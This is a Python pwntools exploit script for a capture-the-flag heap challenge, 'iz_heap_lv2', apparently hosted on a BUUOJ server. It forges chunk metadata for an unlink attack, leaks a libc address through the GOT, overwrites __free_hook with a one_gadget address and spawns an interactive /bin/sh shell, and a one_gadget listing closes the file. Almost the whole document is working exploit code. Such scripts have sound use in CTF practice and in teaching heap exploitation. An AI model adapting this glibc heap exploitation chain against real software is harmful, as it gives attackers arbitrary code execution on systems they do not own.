#!/usr/bin/python3

from pwn import *

exe = ELF("iz_heap_lv2_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""


                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("node4.buuoj.cn", 27790)
else:
    p = process(exe.path)

GDB()


def add(size, data):
    sla(b"Choice: \n", "1")
    sla(b":", str(size).encode())
    sa(b":", data)


def delete(idx):
    sla(b"Choice: \n", "3")
    sla(b":", str(idx).encode())


def edit(idx, data):
    sla(b"Choice: \n", "2")
    sla(b":", str(idx).encode())
    sa(b":", data)


def show(idx):
    sla(b"Choice: \n", "4")
    sla(b":", str(idx).encode())
    p.recvuntil(b"Data: ")
    return u64(p.recvline(keepends=False).ljust(8, b"\0"))


for i in range(9):
    add(0xF8, str(i))

for i in range(7):
    delete(i + 2)

ptr = 0x602040
edit(0, flat(0, 0xF0, ptr - 0x18, ptr - 0x10).ljust(0xF0, b"\0") + flat(0xF0))
delete(1)

edit(0, flat(0, 0, 0, ptr + 8, exe.got["read"]))
libc.address = show(1) - 0x110070
info("Libc: " + hex(libc.address))

add(0x100, "x")
edit(0, flat(0, libc.sym["__free_hook"]))
edit(2, p64(libc.address + 0x4F322))

delete(0)
p.interactive()
"""
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
